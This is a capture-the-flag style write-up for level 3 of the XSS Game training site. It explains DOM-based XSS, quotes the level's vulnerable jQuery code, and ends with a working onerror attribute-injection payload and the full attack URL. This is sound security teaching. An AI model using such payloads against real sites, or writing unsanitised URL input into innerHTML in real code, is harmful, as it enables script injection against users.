
# Level 3: That sinking feeling...

## Challenge Overview
- Level 3 introduces **DOM-based XSS**.
- The application displays different images based on a **URL fragment** (the part after `#`).
- Users can select different tabs/images, and the selection is reflected in the URL.
- **Objective**: Inject JavaScript that triggers an **alert()** through DOM manipulation.
- **URL Structure**: `https://xss-game.appspot.com/level3/frame#[TAB_NUMBER]`

## What is DOM-based XSS?
**DOM-based XSS** occurs when JavaScript code on the page reads from a controllable source (like `window.location`) and writes it to a dangerous sink (like `innerHTML` or `eval()`) **without proper validation**.

## Why URL Fragments?
The part after `#` in a URL (called a fragment or hash) is **never sent to the server**:
```
                                   NOT sent to server
                                   |
https://example.com/page?query=test#fragment
                              |
                              Sent to server
```
> This means traditional server-side XSS filters won't catch it!

## The Vulnerability
```js
function chooseTab(num) {
	// Dynamically load the appropriate image.
	var html = "Image " + parseInt(num) + "<br>";
	html += "<img src='/static/level3/cloud" + num + ".jpg' />";
	$('#tabContent').html(html);  //? VULNERABLE LINE
	// ...
}

window.onload = function() {
	chooseTab(unescape(self.location.hash.substr(1)) || "1");  //? READS FROM URL
}
```
1. Source: `self.location.hash.substr(1)` - reads URL fragment.
2. Processing: `unescape()` - decodes URL encoding.
3. Sink: `$('#tabContent').html(html)` - inserts into DOM without sanitization.
Notice this line:
```js
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
$('#tabContent').html(html);
```
The num variable is inserted **directly** into the HTML string, then rendered with **jQuery's `.html()`** method (equivalent to `innerHTML`). <br>
While `parseInt(num)` is used for the **"Image X"** text, the raw `num` value is used in the image src!

## Understanding the Attack Vector
We need to:
1. Break out of the `src` attribute.
2. Inject our own event handler.
3. Execute JavaScript when the image fails to load.

## Solution
The Payload:
```js
' onerror=alert() '
```
Full URL:
```js
https://xss-game.appspot.com/level3/frame#' onerror=alert() '
```
